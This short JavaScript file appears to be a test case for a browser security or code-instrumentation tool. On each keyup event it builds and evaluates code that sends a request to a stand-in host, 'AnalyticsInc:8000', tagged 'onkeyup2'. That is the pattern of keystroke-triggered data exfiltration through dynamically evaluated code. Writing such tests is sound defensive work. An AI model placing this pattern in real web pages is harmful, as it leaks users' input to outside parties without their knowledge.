// exfil_test_onkeyup2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeyup2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("keyup", JAM.call(Function, null, [exp]), false)

